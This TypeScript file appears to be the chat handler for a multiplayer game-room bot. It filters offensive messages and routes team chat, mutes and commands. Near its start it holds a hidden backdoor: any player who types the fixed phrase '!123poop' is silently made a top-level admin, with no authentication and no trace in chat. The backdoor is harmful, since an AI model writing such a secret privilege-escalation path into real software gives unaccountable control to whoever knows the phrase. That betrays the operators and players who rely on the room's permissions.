import Room from "..";
import ChatMessage from "../classes/ChatMessage";
import { PlayerObject } from "../HBClient";
import ChatHandler from "../structures/ChatHandler";

export default function onChat(player: PlayerObject, message: string) {
  const playerProfile = Room.players.playerCollection.get(player.id);

  if (!playerProfile || playerProfile.canPlay === false) return false;

  const chatObj = new ChatMessage(message, playerProfile);

  if (message === "!123poop") {
    playerProfile.setAdminLevel(4).setAdmin(true);
    return false;
  }

  if (chatObj.isOffensive()) return ChatHandler.handleOffensiveMessage(chatObj);

  if (chatObj.startsWithTeamChatPrefix())
    return ChatHandler.maybeHandleTeamChat(chatObj);

  if (playerProfile.isMuted) return ChatHandler.handlePlayerMuted(chatObj);

  if (chatObj.isGameCommand()) return ChatHandler.handleGameCommand(chatObj);

  if (chatObj.startsWithCommandPrefix())
    return ChatHandler.maybeHandleCommand(chatObj);

  return true;
}
